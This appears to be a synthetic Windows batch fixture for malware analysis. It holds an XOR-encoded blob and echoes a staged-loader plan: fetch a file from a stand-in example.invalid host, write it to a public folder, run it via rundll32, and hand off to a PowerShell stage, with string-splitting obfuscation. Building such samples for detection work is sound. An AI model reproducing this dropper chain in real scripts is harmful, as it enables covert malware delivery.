@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|reverse_xor
rem HUNTRESS-MATERIAL:2.64.67.29.82.11.0.11.10.85.5.4.87.82.30.86.84.82.71.64.14.86.84.82.71.64.108.71.75.86.93.79.71.82.87.29.82.11.0.11.10.85.5.4.87.82.30.86.84.82.71.64.111.81.82.127.64.64.86.65.71.93.70.123.111.80.90.95.81.70.99.111.64.65.86.64.102.111.9.112.14.91.71.82.67.108.86.95.90.85.79.71.82.87.29.87.87.0.82.81.3.7.4.28.87.90.95.82.69.93.90.29.86.95.67.94.82.75.86.29.82.11.0.11.10.85.5.4.87.82.28.28.9.64.67.71.71.91.14.95.65.70.79.82.11.0.11.10.85.5.4.87.82.30.93.84.90.82.67.94.82.80.14.87.90.108.93.84.90.82.67.94.82.80.79.95.95.86.91.64.65.86.68.92.67.14.86.84.82.70.84.93.82.95.108.71.75.86.93.79.71.70.92.108.93.82.85.14.91.67.82.65.84.79.7.14.71.93.70.92.80.108.86.84.82.71.64.79.86.75.86.29.1.0.95.95.87.93.70.65.14.65.86.71.67.82.87.82.79.71.67.90.65.80.64.108.85.85.92.87.93.82.91.31.64.64.86.80.92.65.67.108.91.80.71.82.67.64.90.87.31.86.95.90.85.108.86.71.90.65.68.31.86.71.92.94.86.65.108.86.65.90.70.66.80.82.14.64.67.86.71.64.79.2.14.69
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "v_a0=v=1|steps=acquire_remote,write_file,dispatch_process,handoff_script|adapter=run"
set "v_a1=dll32.exe|stage_count=4|graph=fan_out|next_language=powershell|campaign_id=camp"
set "v_a2=aign-ad76f9838a|url=https://ad76f9838a.example.invalid/740ba3dd.dat|file_path=C"
set "v_a3=:\Users\Public\HuntressLab\stage-ad76f9838a.dat|next_stage=stage-ad76f9838a.ps1"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_opaque_branch=73c32497"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY call set "cfg=%%v_a0%%%%v_a1%%%%v_a2%%%%v_a3%%"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo rundll32.exe acquire, write, dispatch, and hand off stage-ad76f9838a.ps1
exit /b 0
